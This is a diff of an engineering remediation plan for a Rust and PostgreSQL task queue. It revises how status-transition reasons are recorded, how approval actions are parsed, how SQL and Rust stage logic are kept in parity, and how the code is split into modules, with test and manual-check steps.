-WHEN OLD.status IN ('failed', 'dead_letter') AND NEW.status = 'pending'
-    THEN 'operator_resumed'
-```
+`last_error` deliberately remains in place as historical context for the pane. This is the chosen
+UX; do not leave a later implementation decision to clear it.
 
-placed after the existing `pending_approval`/`waiting_for_third_party_reply` arms so those keep
-their more specific reasons.
+**(b) Stop the fallback from lying.**
 
-For the fallback: `ELSE 'retryable_failure'` asserts a cause it has not established. Add an
+Do **not** add a generic `failed`/`dead_letter` → `pending` = `operator_resumed` trigger arm: status
+alone does not prove an operator acted. The operator and approval resume statements write
+`operator_resumed` and `approval_accepted` into `NEW.transition_reason` explicitly.
+
+`ELSE 'retryable_failure'` asserts a cause it has not established. Add an
 `'unknown'` reason to the `task_status_events_reason_check` constraint and to
 `TaskTransitionReason`, and use it. A ledger row that says "we did not classify this" is
 strictly better than one that says the wrong thing, and it makes unclassified transitions
@@ -814,25 +912,32 @@ SELECT from_status, to_status, count(*) FROM task_status_events
  WHERE reason = 'unknown' GROUP BY 1, 2;
 ```
 
-Getting zero rows there is the acceptance signal that the explicit-attribution work in Phase 4 is
-complete.
+Tests must scope this query to the company/tasks they create. A whole-table assertion is invalid
+because DB tests share one database and run in parallel.
 
-**(c) Parse the approval action once.**
+**(c) Parse the approval action once.** Define the shared type beside the approval domain enums so
+both the application parser and persistence port can depend on it without reversing dependencies:
 
 ```rust
 /// Approval actions arrive as strings from a link; parse once so the match is exhaustive and a
 /// new action is a compile error rather than a silently-accepted approval.
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
-pub enum QuorumTimeoutAction { ProceedPartial, Extend(ExtendWindow), Reject }
+pub enum QuorumTimeoutAction {
+    ProceedPartial,
+    Extend { hours: u32 },
+    Reject,
+}
 
 impl FromStr for QuorumTimeoutAction { … }   // "extend_24h" | "extend_48h" | "extend" | …
 ```
 
-Parse at the top of `apply_quorum_timeout_decision`, return `AppError::BadRequest` on an unknown
-action instead of guessing, and drive both the reason mapping and the existing
-`match action { … }` body from the enum. The `_ =>` arm disappears by construction.
+The application already parses link input into `LinkAction`. Represent its quorum-specific branch
+with `QuorumTimeoutAction`, pass that type through
+`ApprovalPersistence::consume_quorum_timeout_action`, and drive the persistence match from it.
+Unknown strings return `AppError::BadRequest` at the existing link-input boundary; the persistence
+adapter never parses or guesses. The `_ =>` arms disappear by construction.
 
-Add an `ApprovalRejected` reason (enum + CHECK constraint) so `reject` no longer has to borrow
+Use the `ApprovalRejected` reason added in Phase 4 so `reject` no longer borrows
 `operator_stopped` with a mismatched actor kind:
 
 ```rust
@@ -842,37 +947,39 @@ QuorumTimeoutAction::Reject => TaskTransitionReason::ApprovalRejected,
 ### Tests
 
 - **DB-backed:** dead-letter a task (exhaust `max_retries`), `resume_task(id,
-  TransitionActor::Operator(..))`, assert `retry_count == 0`, status `pending`, and that the event
+  ResumeActor::Operator(..))`, assert `retry_count == 0`, status `pending`, and that the event
   reason is `operator_resumed` with `actor_kind = 'operator'`.
+- **DB-backed:** stop an exhausted task, resume it as an operator, and assert the budget resets.
 - **DB-backed:** resume from `pending_approval` via the approval path, assert `retry_count` is
   **unchanged** and the reason is `approval_accepted`.
-- **DB-backed:** assert no `reason = 'unknown'` rows are produced across the existing worker
-  lifecycle tests — a cheap global net.
+- **DB-backed:** within each lifecycle test, assert its own company/tasks produced no unexpected
+  `reason = 'unknown'` rows.
 - **Pure:** `QuorumTimeoutAction::from_str` round-trip, including the unknown-action error.
 
 ### Done when
 
 - [ ] Resuming a dead-lettered task actually gets a fresh retry budget; a continuation does not.
-- [ ] The trigger has an explicit `failed`/`dead_letter` → `pending` arm.
-- [ ] The `ELSE` fallback records `unknown`, and `reason = 'unknown'` is empty after a full test run.
-- [ ] Approval actions are parsed into an enum; no `_ =>` guess remains.
+- [ ] Resuming an exhausted stopped task also gets a fresh budget for an operator.
+- [ ] Resume reasons come from typed row-local attribution, not a status-only trigger guess.
+- [ ] The fallback records `unknown`; scoped lifecycle assertions produce none unexpectedly.
+- [ ] The typed quorum action crosses the persistence boundary; no duplicate string match remains.
 - [ ] `reject` records `approval_rejected` with `actor_kind = 'approval'`.
 
 ---
 
-## Phase 6 — One source of truth for stage and lease-lost
+## Phase 6 — Enforce stage parity and make lease-lost explicit
 
 ### Goal
 
-Two rules are written twice, in two languages, with nothing that fails a release build when they
-drift.
+The stage rule necessarily exists in Rust and SQL but lacks a release-build parity check; lease
+loss is classified by duplicated free-text instead of explicit row-local attribution.
 
 ### The defects
 
 **(a) Stage derivation exists in SQL and in Rust.** The production decision is the `CASE` in the
 `staged` CTE (`src/adapters/persistence/task.rs`, inside `list_task_chain_board`).
-`ChainStage::derive` (`src/domain/entities/task.rs:729`) is a Rust re-implementation used only by
-`debug_assert_eq!` (`task.rs:353`) and by the three new unit tests
+`ChainStage::derive` is a Rust re-implementation used only by a `debug_assert_eq!` in the row
+conversion and by the three new unit tests
 (`every_individual_chain_state_maps_to_its_operational_stage`,
 `chain_stage_precedence_surfaces_mixed_work_and_delivery_failures`,
 `completed_chains_require_every_task_and_delivery_to_succeed`).
@@ -881,7 +988,7 @@ In release builds nothing checks them against each other. The three tests read l
 board staging and cover the copy production never runs.
 
 **(b) The lease-lost error string is duplicated into the trigger.**
-`const LEASE_EXPIRED_ERROR` (`task.rs:72`) is matched by literal text in the trigger:
+`const LEASE_EXPIRED_ERROR` is matched by literal text in the trigger:
 
 ```sql
 WHEN OLD.status = 'processing' AND NEW.status = 'pending'
@@ -899,36 +1006,38 @@ Editing the Rust constant silently reclassifies every future lease loss as `retr
 
 ### Design
 
-**(a) Generate the SQL from the Rust definition.**
+**(a) Keep each representation in its owning layer and enforce their parity.**
 
 The SQL genuinely needs `stage` as a column — `PARTITION BY stage` drives both the per-column
-`ROW_NUMBER()` limit and the `stage_total` count — so it cannot move wholesale into Rust. Make the
-Rust definition the source and emit the SQL from it:
+`ROW_NUMBER()` limit and the `stage_total` count — so it cannot move wholesale into Rust. Keep
+`ChainStage::derive` in the domain and the SQL expression in the persistence board module; putting
+SQL on the domain type would violate the repository's dependency-direction rule. State plainly
+that these are two representations protected by an equivalence test:
 
 ```rust
 impl ChainStage {
-    /// The board's precedence, as one pure decision. [`Self::SQL_CASE`] is the same ladder for the
-    /// window functions that need `stage` as a column; the two are checked against each other by
-    /// `chain_stage_sql_matches_rust_derivation`.
+    /// The Rust representation of the board precedence.
     pub fn derive(counts: &TaskChainCounts) -> Self { … }
-
-    /// Must stay rung-for-rung identical to [`Self::derive`].
-    pub const SQL_CASE: &'static str = r#"CASE
-        WHEN failed > 0 OR dead_letter > 0 OR stopped > 0
-             OR expired_processing > 0 OR delivery_failed > 0 THEN 'needs_attention'
-        WHEN pending_approval > 0 THEN 'waiting_approval'
-        WHEN processing > 0 OR delivery_sending > 0 THEN 'running'
-        WHEN waiting_reply > 0 THEN 'waiting_reply'
-        WHEN pending > 0 OR delivery_pending > 0 THEN 'queued'
-        WHEN total_tasks > 0 AND completed = total_tasks
-             AND delivery_sent = total_deliveries THEN 'completed'
-        ELSE 'needs_attention'
-    END"#;
 }
+
+// In adapters/persistence/task/board.rs:
+/// The SQL representation used by board window functions. The DB-backed matrix test is the
+/// release-build guard that keeps it rung-for-rung identical to `ChainStage::derive`.
+const CHAIN_STAGE_SQL_CASE: &str = r#"CASE
+    WHEN failed > 0 OR dead_letter > 0 OR stopped > 0
+         OR expired_processing > 0 OR delivery_failed > 0 THEN 'needs_attention'
+    WHEN pending_approval > 0 THEN 'waiting_approval'
+    WHEN processing > 0 OR delivery_sending > 0 THEN 'running'
+    WHEN waiting_reply > 0 THEN 'waiting_reply'
+    WHEN pending > 0 OR delivery_pending > 0 THEN 'queued'
+    WHEN total_tasks > 0 AND completed = total_tasks
+         AND delivery_sent = total_deliveries THEN 'completed'
+    ELSE 'needs_attention'
+END"#;
 ```
 
-and interpolate `{case}` into the board query via `format!`. One edit site, and the two now sit
-adjacent so a change to one is visibly a change to the other.
+Interpolate `{case}` into the board query via `format!`. This removes the third inline copy from
+the query, but does not claim that Rust generates SQL; the matrix below is the drift guard.
 
 **Back it with a real test, not a `debug_assert`.** Add a DB-backed test that pushes a matrix of
 `TaskChainCounts` through the actual SQL and compares against `derive`:
@@ -940,7 +1049,7 @@ async fn chain_stage_sql_matches_rust_derivation() {
     for counts in stage_matrix() {          // every count field at 0 and 1, plus the mixed cases
         let sql: String = sqlx::query_scalar(&format!(
             "SELECT {} FROM (SELECT $1::bigint AS failed, …) AS combined",
-            ChainStage::SQL_CASE
+            CHAIN_STAGE_SQL_CASE
         )).bind(…).fetch_one(&pool).await.unwrap();
         assert_eq!(ChainStage::from_str(&sql).unwrap(), ChainStage::derive(&counts),
                    "SQL and Rust disagree for {counts:?}");
@@ -951,32 +1060,31 @@ async fn chain_stage_sql_matches_rust_derivation() {
 This is the test the three existing pure ones were standing in for. Keep them — they document
 intent — but this is the one that catches drift.
 
-Then remove `debug_assert_eq!` at `task.rs:353`, or promote it to a real error. Prefer removal:
-with the matrix test in place the assert is redundant, and a `debug_assert` on a value read from
-the database is a panic waiting for production data the test matrix did not anticipate.
+Then remove the conversion-time `debug_assert_eq!`. With the matrix test in place the assert is
+redundant, and a debug-only panic on database data is not the parity mechanism.
 
 **(b) Delete the lease-lost string match rather than syncing it.**
 
-The reason the trigger sniffs `last_error` is that the lease sweep is a *set-based* UPDATE over
-many tasks in one statement (`task.rs:1702`) and never calls `set_task_transition_context`. But
-every row that statement touches is lease-lost by definition, so a single transaction-local setting
-covers the whole batch:
-
-```rust
-set_task_transition(&mut tx, TaskTransitionReason::LeaseLost, TransitionActor::System).await?;
-// … the existing set-based UPDATE, unchanged …
-```
-
-The trigger's own fallback then fills in the per-row actor correctly:
+The lease sweep is a set-based UPDATE over rows held by different workers. Option B handles this
+without session state: in the same UPDATE, copy each row's current worker into the transition
+columns before clearing the lease fields. PostgreSQL evaluates right-hand expressions from the old
+row:
 
 ```sql
-IF transition_actor_id IS NULL AND transition_actor_kind = 'worker' THEN
-    transition_actor_id := COALESCE(NEW.worker_id, CASE WHEN TG_OP = 'UPDATE' THEN OLD.worker_id END);
+SET transition_reason = 'lease_lost',
+    transition_actor_kind = 'worker',
+    transition_actor_id = worker_id,
+    transition_approval_id = NULL,
+    transition_outreach_id = NULL,
+    -- existing retry/status fields follow
+    worker_id = NULL,
+    execution_generation = NULL,
+    locked_at = NULL,
+    lock_expires_at = NULL
 ```
 
-so each reaped row still attributes to the worker that lost it — which is more accurate than a
-single sweep-wide actor. (Set `actor_kind` to `worker` for this, not `system`, so that fallback
-engages.)
+Each event therefore records the worker that actually lost that row's lease. No
+`TransitionActor::System`, shared batch actor, GUC setter, or trigger fallback is involved.
 
 With that in place, **delete both `NEW.last_error = '…'` arms from the trigger.** The duplication
 is gone rather than synchronised.
@@ -990,9 +1098,10 @@ is gone rather than synchronised.
 
 ### Done when
 
-- [ ] The stage ladder is written once; the SQL is generated from it.
+- [ ] Rust and SQL stage representations stay in their owning layers and are protected by a
+      DB-backed parity matrix.
 - [ ] A DB-backed matrix test compares SQL against Rust; `debug_assert_eq!` removed.
-- [ ] The lease sweep sets its own transition reason.
+- [ ] The lease sweep sets all five transition columns in its existing set-based UPDATE.
 - [ ] Both `last_error` string-matching arms are gone from the trigger.
 - [ ] `LEASE_EXPIRED_ERROR` appears only in Rust.
 
@@ -1023,16 +1132,18 @@ Proposed decomposition along the phase boundaries already in the file:
 |------|----------|
 | `task/mod.rs` | the `TaskPersistence` trait, shared `*Db` structs and their `TryFrom` impls, `OUTBOX_COLUMNS`, shared consts |
 | `task/queue.rs` | enqueue, claim, lease renewal/expiry sweep, complete, `mark_task_failed`, stop/resume |
-| `task/board.rs` | `list_task_chain_board`, `get_task_chain_detail`, `list_task_status_events`, the transition-context setters |
+| `task/board.rs` | `list_task_chain_board`, `get_task_chain_detail`, `list_task_status_events` |
 | `task/outreach.rs` | outreach start/response/timeout/extend |
 | `task/attempts.rs` | attempt ledger reads and writes |
 
-with `#[cfg(test)] #[path = "board_tests.rs"] mod tests;` per file. Move the mocks that get
-re-declared across the 6 implementor sites into one shared `test_support` module while here.
+Keep the row-attribution structs and conversion helpers beside the status-changing queue methods.
+Use sibling `*_tests.rs` files for any test module over ~500 lines. The six external mocks have
+different state and behavior; update them in Phase 4 but do not claim they can all be replaced by
+one shared mock here.
 
 Do this as a **pure move** — no logic changes in the same commit — so the diff is reviewable.
 
-**(b) Name the timeline tuple.** `src/adapters/http/pages/task_board.rs:302`:
+**(b) Name the timeline tuple.** `chain_timeline` currently begins with:
 
 ```rust
 let mut entries: Vec<(DateTime<Utc>, Uuid, i32, String)> = Vec::new();
@@ -1060,46 +1171,30 @@ enum TimelineKind { StatusEvent, Attempt, Delivery, Approval, Outreach }
 Sorting by `(at, task_id, kind, sequence)` derives the ordering from the enum's declaration order
 instead of from magic offsets, and removes the "what happens past 10,000 events" question. It also
 fixes the current instability where every delivery for a task gets the identical key `20_000`.
+Use the real event sequence and attempt number where available; enumerate deliveries, approvals and
+outreaches after their existing deterministic `(timestamp, id)` ordering so every key is stable.
 
-**(c) Dead code.** `TaskBoardFilter::with_limit` and `MAX_PER_COLUMN`
-(`src/domain/entities/task.rs:843`) are never called — `board_filter()` always takes the default 50,
-and no query parameter reaches them. Either wire a `per_column` param through `TasksQuery` (the
-clamp is already written and correct) or delete both. Deleting is the honest default; add it back
-when a caller exists.
+**(c) Dead code.** `TaskBoardFilter::with_limit` and `MAX_PER_COLUMN` are never called —
+`board_filter()` always takes the default 50 and no query parameter reaches them. Delete both; do
+not add a `per_column` wire parameter in this remediation.
 
-**(d) Round trips on the failure path.** `mark_task_failed` went from one statement on the pool to
-`BEGIN` + `set_config` + `UPDATE` + `COMMIT` — four round trips on **every** task failure and
-retry, the hottest write in the queue.
+**(d) Confirm the row-local attribution result.** Option B is implemented in Phase 4 with five
+columns, not left as a choice here. Confirm `mark_task_failed` and other single-statement status
+transitions no longer open a transaction solely to call `set_config`; the status and attribution
+must land in one UPDATE.
 
-Two options:
-
-- **Option A (small):** accept it. Correctness first, and the queue is not currently round-trip
-  bound. Measure before optimising.
-- **Option B (better, if the schema is open anyway):** replace the transaction-local GUC mechanism
-  with a `transition_reason` / `transition_actor_kind` / `transition_actor_id` triple of nullable
-  columns on `background_tasks`, set by the same `UPDATE` that changes `status`, and read by the
-  trigger from `NEW.*` instead of `current_setting()`. That removes the extra round trip, removes
-  the GUC-leak class of bug entirely (Phase 4 mitigates it; this eliminates it), and makes the
-  intended reason visible in the row rather than in invisible session state.
-
-  Cost: three columns on a hot table, and every status-changing `UPDATE` must set them (which is
-  the point — forgetting becomes visible in the ledger as `unknown` from Phase 5). The set-based
-  lease sweep works naturally under this scheme too.
-
-  Recommended given the DB is pre-release and reset-on-change, but it is a real redesign — do not
-  fold it into another phase.
-
-**(e) Reduce trigger chatter.** If not already done in Phase 3: add
-`WHEN (TG_OP = 'INSERT' OR OLD.status IS DISTINCT FROM NEW.status)` to `email_outbox_notify_chain`
-and `human_approvals_notify_chain` so no-op status writes stop waking every connected board.
+No-op chain-notification suppression belongs solely to Phase 3; do not duplicate its trigger work
+in this cleanup phase.
 
 ### Done when
 
-- [ ] No file touched by this work exceeds ~1,000 lines; no inline test module exceeds ~500.
+- [ ] New `persistence/task/` modules stay near the repository size threshold and oversized inline
+      tests moved to sibling files.
+- [ ] Other pre-existing oversized files touched by the remediation are recorded as deferred
+      structural debt; this phase does not claim repository-wide threshold compliance.
 - [ ] `chain_timeline` uses a named struct and an ordering enum; no magic offsets.
-- [ ] `with_limit`/`MAX_PER_COLUMN` either wired to a query parameter or deleted.
-- [ ] A decision recorded on Option A vs B for the transition-context mechanism.
-- [ ] Notify triggers fire only on real status changes.
+- [ ] `with_limit` and `MAX_PER_COLUMN` are deleted.
+- [ ] Failure/status transitions write attribution in the same statement, with no GUC round trip.
 
 ---
 
@@ -1119,7 +1214,7 @@ DATABASE_URL="postgres://mac03@localhost:5432/mail_agents_test" cargo test --lib
 cargo fmt
 ```
 
-Manual pass on the board once Phase 3 lands (server on `:3001`):
+Manual pass after all phases land (server on `:3001`):
 
 1. Create a channel named `<b>bold</b>`; confirm the board card shows the literal text, not markup.
 2. Open `/ui/tasks?view=board` in two browser windows; run a task in an *unrelated* chain; confirm
@@ -1127,7 +1222,8 @@ Manual pass on the board once Phase 3 lands (server on `:3001`):
 3. Select a chain, drive it through approval and outreach; confirm the timeline reasons read
    `approval_requested` / `approval_accepted` / `outreach_started`, never `retryable_failure`.
 4. Dead-letter a task, hit Resume, confirm it runs again and survives one more failure.
-5. `SELECT reason, count(*) FROM task_status_events GROUP BY 1` — no `unknown` rows.
+5. Query `task_status_events` for the exercised company/correlation IDs — no unexpected `unknown`
+   rows.
 
 ### Ledger health query
 
